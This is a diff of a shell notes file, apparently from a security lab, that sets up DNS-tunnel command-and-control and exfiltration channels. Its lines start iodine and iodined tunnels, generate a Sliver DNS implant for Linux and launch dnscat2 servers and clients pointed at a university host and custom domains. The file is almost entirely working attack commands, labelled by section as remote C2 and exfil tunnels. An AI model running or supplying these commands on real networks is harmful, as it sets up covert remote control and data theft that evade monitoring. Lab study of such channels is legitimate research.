@@ -7,7 +7,7 @@ pass=$1
 sudo iodined -f -P bleed 10.0.0.1 t.bleed.io 
 
 # iodine c2c client 
-sudo iodine -P bleed -f -r 192.168.64.27 t.bleed.io 
+sudo iodine -P bleed  -r 10.158.82.53 t.bleed.io 
  
 
 # ################# Sliver DNS Remote C2 and Tunnel Remote Exfil tunnel ##########################
@@ -19,8 +19,10 @@ generate --dns sliver.pole.io.  --debug --os linux  --save /tmp/bleed
 
 
 # ################# dnscat2 DNS Remote C2 and Tunnel Remote Exfil tunnel ##########################
-sudo ruby dnscat2.rb --dns 'host=cssvlab06.uwb.edu,domain=dnscat.strives.io'
+sudo ruby dnscat2.rb --dns 'host=cssvlab06.uwb.edu,domain=dnscat.strive.io'
+./dnscat --secret= dnscat.strives.io
 
+sudo ruby dnscat2.rb --dns 'host=cssvlab06.uwb.edu,port=143,domain=dnscat.strive.io'
+./dnscat --dns server=cssvlab06.uwb.edu,port=143,domain=dnscat.strive.io --secret=
 
-sudo ruby dnscat2.rb --dns 'host=cssvlab06.uwb.edu,port=443,domain=dnscat.strives.io'
 
